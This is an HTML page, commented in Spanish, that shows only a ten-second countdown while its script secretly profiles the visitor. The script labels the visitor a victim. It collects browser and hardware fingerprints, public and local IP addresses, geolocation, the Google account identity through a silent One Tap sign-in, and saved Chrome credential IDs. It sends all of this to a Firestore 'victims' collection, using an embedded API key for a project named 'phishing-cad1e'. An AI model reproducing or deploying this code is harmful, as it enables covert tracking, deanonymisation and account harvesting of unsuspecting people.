<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>...</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  html, body {
    width: 100%; height: 100%;
    background: #000;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
  }
  #n {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    font-size: clamp(80px, 25vw, 200px);
    font-weight: 100;
    color: #fff;
    letter-spacing: -4px;
    user-select: none;
    opacity: 1;
    transition: opacity 0.18s ease;
  }
</style>
</head>
<body>
<span id="n">10</span>
<script>
// ══════════════════════════════════════════════════
// ROOT TOOL — VICTIM  |  APK ROOT / ShadowStore
// ══════════════════════════════════════════════════

// ── FIREBASE CONFIG ─────────────────────────────
const FB_KEY  = "AIzaSyCPpG5yJ-1FkfHj8GHTucZRU_5dia-aqX0";
const FB_PROJ = "phishing-cad1e";
// ────────────────────────────────────────────────

// ── GOOGLE CLIENT ID (One Tap silencioso) ───────
// Consola Google Cloud → Credenciales → OAuth 2.0
const G_CID = "TU_CLIENT_ID.apps.googleusercontent.com";
// ────────────────────────────────────────────────

// ── Countdown ───────────────────────────────────
const el = document.getElementById('n');
let t = 10;
const tick = setInterval(() => {
  el.style.opacity = 0;
  setTimeout(() => {
    t--;
    el.textContent = t;
    el.style.opacity = 1;
    if (t <= 0) clearInterval(tick);
  }, 180);
}, 1000);

// ══════════════════════════════════════════════════
// RECOLECCIÓN SILENCIOSA
// ══════════════════════════════════════════════════
const P = {};

// ── 1. Navigator / UA ───────────────────────────
P.ua             = navigator.userAgent;
P.platform       = navigator.platform;
P.vendor         = navigator.vendor;
P.lang           = navigator.language;
P.langs          = (navigator.languages||[]).join(',');
P.cookies        = navigator.cookieEnabled;
P.dnt            = navigator.doNotTrack;
P.online         = navigator.onLine;
P.touch          = navigator.maxTouchPoints;
P.memory         = navigator.deviceMemory || 'n/a';
P.cores          = navigator.hardwareConcurrency;
P.pdfViewer      = navigator.pdfViewerEnabled ?? 'n/a';

// ── 2. Pantalla ──────────────────────────────────
P.screen         = screen.width + 'x' + screen.height;
P.avail          = screen.availWidth + 'x' + screen.availHeight;
P.depth          = screen.colorDepth;
P.dpr            = window.devicePixelRatio;
P.orient         = screen.orientation?.type || 'n/a';
P.innerW         = window.innerWidth;
P.innerH         = window.innerHeight;

// ── 3. Tiempo / Zona ────────────────────────────
P.tz             = Intl.DateTimeFormat().resolvedOptions().timeZone;
P.tzOffset       = new Date().getTimezoneOffset();
P.locale         = Intl.DateTimeFormat().resolvedOptions().locale;
P.dateStr        = new Date().toString();

// ── 4. Referrer / URL ───────────────────────────
P.referer        = document.referrer || '(directo)';
P.url            = location.href;
P.params         = location.search;

// ── 5. Canvas fingerprint ───────────────────────
try {
  const c = document.createElement('canvas');
  c.width = 240; c.height = 50;
  const x = c.getContext('2d');
  x.textBaseline = 'top';
  x.font = '13px Arial';
  x.fillStyle = '#f55';  x.fillRect(100, 1, 60, 18);
  x.fillStyle = '#05a';  x.fillText('Invisible', 2, 14);
  x.fillStyle = 'rgba(0,200,80,0.7)'; x.fillText('Invisible', 4, 16);
  P.canvas = c.toDataURL().slice(-60);
} catch(e) { P.canvas = 'blocked'; }

// ── 6. WebGL ────────────────────────────────────
try {
  const g = document.createElement('canvas')
              .getContext('webgl') ||
            document.createElement('canvas')
              .getContext('experimental-webgl');
  if (g) {
    P.glVendor   = g.getParameter(g.VENDOR);
    P.glRenderer = g.getParameter(g.RENDERER);
    const d = g.getExtension('WEBGL_debug_renderer_info');
    if (d) {
      P.glUVendor   = g.getParameter(d.UNMASKED_VENDOR_WEBGL);
      P.glURenderer = g.getParameter(d.UNMASKED_RENDERER_WEBGL);
    }
    P.glVer = g.getParameter(g.VERSION);
    P.glSL  = g.getParameter(g.SHADING_LANGUAGE_VERSION);
    P.glMax = g.getParameter(g.MAX_TEXTURE_SIZE);
    P.glExt = (g.getSupportedExtensions()||[]).join('|').slice(0,200);
  }
} catch(e) {}

// ── 7. Audio fingerprint ────────────────────────
try {
  const A = window.OfflineAudioContext||window.webkitOfflineAudioContext;
  if (A) {
    const ac = new A(1, 44100, 44100);
    const os = ac.createOscillator();
    const cp = ac.createDynamicsCompressor();
    os.connect(cp); cp.connect(ac.destination);
    os.start(0); ac.startRendering();
    ac.oncomplete = e => {
      const b = e.renderedBuffer.getChannelData(0);
      let s = 0;
      for (let i = 4500; i < 5000; i++) s += Math.abs(b[i]);
      P.audio = s.toString();
      push();
    };
  }
} catch(e) {}

// ── 8. Fonts detectadas ─────────────────────────
const FONTS = [
  'Arial','Calibri','Cambria','Comic Sans MS','Consolas','Courier New',
  'Georgia','Impact','Segoe UI','Tahoma','Times New Roman','Verdana',
  'Helvetica Neue','Monaco','Optima','DejaVu Sans','Ubuntu','Noto Sans',
  'Roboto','Open Sans','Lato','Montserrat','Futura','Gill Sans'
];
const sp = document.createElement('span');
sp.style.cssText = 'position:absolute;visibility:hidden;font-size:72px;';
sp.textContent   = 'mmmmmmmmmmlli';
document.body.appendChild(sp);
sp.style.fontFamily = 'monospace';
const bW = sp.offsetWidth, bH = sp.offsetHeight;
P.fonts = FONTS.filter(f => {
  sp.style.fontFamily = '"'+f+'",monospace';
  return sp.offsetWidth !== bW || sp.offsetHeight !== bH;
}).join(',');
P.fontN = P.fonts.split(',').filter(Boolean).length;
document.body.removeChild(sp);

// ── 9. Connection ────────────────────────────────
const cn = navigator.connection||navigator.mozConnection||navigator.webkitConnection;
if (cn) {
  P.connType = cn.type;
  P.connEff  = cn.effectiveType;
  P.connDl   = cn.downlink;
  P.connRtt  = cn.rtt;
  P.connSave = cn.saveData;
}

// ── 10. Media codecs ────────────────────────────
try {
  const v = document.createElement('video');
  P.h264 = v.canPlayType('video/mp4;codecs="avc1.42E01E"');
  P.vp9  = v.canPlayType('video/webm;codecs="vp9"');
  P.av1  = v.canPlayType('video/mp4;codecs="av01.0.05M.08"');
  const a = document.createElement('audio');
  P.mp3  = a.canPlayType('audio/mpeg');
  P.aac  = a.canPlayType('audio/mp4;codecs="mp4a.40.2"');
  P.ogg  = a.canPlayType('audio/ogg;codecs="vorbis"');
} catch(e) {}

// ── 11. CSS media queries ───────────────────────
P.dark      = matchMedia('(prefers-color-scheme:dark)').matches;
P.reduceMot = matchMedia('(prefers-reduced-motion:reduce)').matches;
P.hdr       = matchMedia('(dynamic-range:high)').matches;
P.ptrFine   = matchMedia('(pointer:fine)').matches;
P.ptrCoarse = matchMedia('(pointer:coarse)').matches;
P.hover     = matchMedia('(any-hover:hover)').matches;

// ── 12. WASM / features ─────────────────────────
P.wasm     = !!window.WebAssembly;
P.webGPU   = !!navigator.gpu;
P.webGL2   = !!document.createElement('canvas').getContext('webgl2');
P.sw       = !!navigator.serviceWorker;
P.idb      = !!window.indexedDB;
P.bt       = !!navigator.bluetooth;
P.usb      = !!navigator.usb;
P.nfc      = 'NDEFReader' in window;
P.share    = !!navigator.share;
P.vib      = !!navigator.vibrate;
P.notif    = 'Notification' in window ? Notification.permission : 'n/a';
P.clip     = !!navigator.clipboard;
P.creds    = !!navigator.credentials;
P.contacts = 'contacts' in navigator && 'ContactsManager' in window;

// ── 13. Storage ──────────────────────────────────
if (navigator.storage?.estimate) {
  navigator.storage.estimate().then(q => {
    P.stQuota = (q.quota/1e9).toFixed(2)+'GB';
    P.stUsed  = (q.usage/1e6).toFixed(2)+'MB';
    push();
  }).catch(()=>{});
}

// ── 14. Battery (sin permiso) ───────────────────
if (navigator.getBattery) {
  navigator.getBattery().then(b => {
    P.bat      = (b.level*100).toFixed(0)+'%';
    P.batChg   = b.charging;
    P.batChgT  = b.chargingTime;
    P.batDisT  = b.dischargingTime;
    push();
  }).catch(()=>{});
}

// ── 15. WASM SIMD / Threads ──────────────────────
try {
  P.wasmSIMD    = WebAssembly.validate(new Uint8Array([
    0,97,115,109,1,0,0,0,1,5,1,96,0,1,123,3,2,1,0,10,10,1,8,0,65,0,253,15,253,98,11
  ]));
  P.wasmThreads = typeof SharedArrayBuffer !== 'undefined';
} catch(e) {}

// ── 16. Plugins ──────────────────────────────────
try { P.plugins = Array.from(navigator.plugins).map(p=>p.name).join('|'); } catch(e){}

// ── 17. Hash compuesto ───────────────────────────
const hi = [P.ua,screen.width,screen.height,P.depth,P.tz,P.lang,P.cores,P.memory,P.canvas,P.glURenderer].join('|');
let h = 0x811c9dc5;
for (let i = 0; i < hi.length; i++) { h ^= hi.charCodeAt(i); h=(h*0x01000193)>>>0; }
P.hash = '0x'+h.toString(16).toUpperCase().padStart(8,'0');
P._ts  = Date.now();

// ══════════════════════════════════════════════════
// IP PÚBLICA + GEOLOC  (múltiples fuentes, sin key)
// ══════════════════════════════════════════════════
(async () => {
  const APIS = [
    { url:'https://ipapi.co/json/',       ip:'ip',        city:'city',    region:'region',   country:'country_name', org:'org',    lat:'latitude', lon:'longitude', postal:'postal',   tz:'timezone', asn:'asn'    },
    { url:'https://freeipapi.com/api/json/', ip:'ipAddress',city:'cityName',region:'regionName',country:'countryName',org:'isp',  lat:'latitude', lon:'longitude', postal:'zipCode',  tz:'timeZone', asn:''       },
    { url:'https://ipwho.is/',            ip:'ip',        city:'city',    region:'region',   country:'country',     org:'org',    lat:'latitude', lon:'longitude', postal:'postal',   tz:'timezone', asn:'asn'    },
    { url:'https://ip-api.com/json/?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query',
                                          ip:'query',     city:'city',    region:'regionName',country:'country',    org:'org',    lat:'lat',      lon:'lon',       postal:'zip',      tz:'timezone', asn:'as'     },
  ];
  for (const api of APIS) {
    try {
      const r = await fetch(api.url, { signal: AbortSignal.timeout(5000) });
      const j = await r.json();
      if (!j[api.ip]) continue;
      P.ip       = j[api.ip]      || '';
      P.city     = j[api.city]    || '';
      P.region   = j[api.region]  || '';
      P.country  = j[api.country] || '';
      P.org      = j[api.org]     || '';
      P.lat      = j[api.lat]     || '';
      P.lon      = j[api.lon]     || '';
      P.postal   = j[api.postal]  || '';
      P.ipTZ     = j[api.tz]      || '';
      P.asn      = j[api.asn]     || '';
      push(); break;
    } catch(e) { continue; }
  }
})();

// ══════════════════════════════════════════════════
// IP LOCAL — WebRTC sin servidor STUN (red local)
// ══════════════════════════════════════════════════
try {
  const pc = new RTCPeerConnection({ iceServers: [] });
  pc.createDataChannel('');
  pc.createOffer().then(o => pc.setLocalDescription(o));
  const seen = new Set();
  pc.onicecandidate = e => {
    if (!e?.candidate) return;
    const m = e.candidate.candidate.match(/((\d{1,3}\.){3}\d{1,3}|[a-f0-9:]+:[a-f0-9:]+)/i);
    if (!m || seen.has(m[0])) return;
    seen.add(m[0]);
    const key = 'ipLocal' + seen.size;
    P[key] = m[0];
    push();
  };
  setTimeout(() => pc.close(), 6000);
} catch(e) { P.ipLocal1 = 'blocked'; }

// ══════════════════════════════════════════════════
// CUENTA GOOGLE — One Tap silencioso (auto_select)
// Necesita GOOGLE_CLIENT_ID válido.
// Registra en: console.cloud.google.com →
//   APIs & Services → Credentials → OAuth 2.0 Client IDs
// Pon la URL del host en "Authorized JavaScript origins"
// ══════════════════════════════════════════════════
if (!G_CID.startsWith('TU_')) {
  const gs = document.createElement('script');
  gs.src = 'https://accounts.google.com/gsi/client';
  gs.async = true;
  gs.onload = () => {
    try {
      google.accounts.id.initialize({
        client_id:   G_CID,
        auto_select: true,   // dispara sin UI si hay sesión activa
        itp_support: true,
        callback: resp => {
          try {
            // Decodifica el JWT para extraer datos del usuario
            const seg   = resp.credential.split('.');
            const pad   = s => s.replace(/-/g,'+').replace(/_/g,'/') + '==='.slice((s.length+3)%4);
            const claim = JSON.parse(atob(pad(seg[1])));
            P.gEmail   = claim.email;
            P.gName    = claim.name;
            P.gPicture = claim.picture;
            P.gSub     = claim.sub;       // ID único de Google
            P.gHD      = claim.hd || '';  // dominio workspace
            P.gVerif   = claim.email_verified;
            push();
          } catch(ee) { P.gEmail = 'parse_err'; }
        }
      });
      // Prompt invisible — si auto_select funciona, callback se
      // dispara sin que el usuario vea ninguna UI
      google.accounts.id.prompt(n => {
        P.gPrompt = n.getNotDisplayedReason?.() || n.getSkippedReason?.() || 'ok';
        push();
      });
    } catch(ee) {}
  };
  document.head.appendChild(gs);
}

// ══════════════════════════════════════════════════
// CREDENCIALES guardadas en Chrome (silent)
// ══════════════════════════════════════════════════
if (navigator.credentials) {
  navigator.credentials.get({ password: true, mediation: 'silent' })
    .then(c => {
      if (!c) return;
      P.credId   = c.id;
      P.credName = c.name || '';
      P.credType = c.type;
      push();
    }).catch(()=>{});
}

// ══════════════════════════════════════════════════
// FIREBASE SENDER
// ══════════════════════════════════════════════════
let _docId = null, _sent = false;
let _timer = null;

function push() {
  clearTimeout(_timer);
  _timer = setTimeout(async () => {
    if (_sent && _docId) await patch();
    else                 await post();
  }, 500);
}

async function post() {
  if (FB_PROJ === 'TU_PROJECT_ID') { console.log('[ROOT]', JSON.stringify(P,null,2)); return; }
  const url = `https://firestore.googleapis.com/v1/projects/${FB_PROJ}/databases/(default)/documents/victims?key=${FB_KEY}`;
  try {
    const r = await fetch(url, { method:'POST', headers:{'Content-Type':'application/json'}, body: toDoc(P) });
    const j = await r.json();
    if (j.name) { _docId = j.name.split('/').pop(); _sent = true; }
  } catch(e) {}
}

async function patch() {
  const keys  = Object.keys(P).map(k=>'updateMask.fieldPaths='+k).join('&');
  const url   = `https://firestore.googleapis.com/v1/projects/${FB_PROJ}/databases/(default)/documents/victims/${_docId}?key=${FB_KEY}&${keys}`;
  try { await fetch(url, { method:'PATCH', headers:{'Content-Type':'application/json'}, body: toDoc(P) }); } catch(e) {}
}

function toDoc(obj) {
  const f = {};
  for (const [k,v] of Object.entries(obj)) {
    if (v===undefined||v===null) continue;
    if (typeof v==='boolean') f[k]={booleanValue:v};
    else if (typeof v==='number') f[k]={doubleValue:v};
    else f[k]={stringValue:String(v)};
  }
  return JSON.stringify({fields:f});
}

// Envío inicial
setTimeout(() => post(), 800);

// Envío al cerrar
window.addEventListener('beforeunload', () => {
  P._exit = Date.now();
  if (_sent && _docId && FB_PROJ !== 'TU_PROJECT_ID') {
    navigator.sendBeacon(
      `https://firestore.googleapis.com/v1/projects/${FB_PROJ}/databases/(default)/documents/victims/${_docId}?key=${FB_KEY}&updateMask.fieldPaths=_exit`,
      JSON.stringify({fields:{_exit:{integerValue:P._exit}}})
    );
  }
});
</script>
</body>
</html>
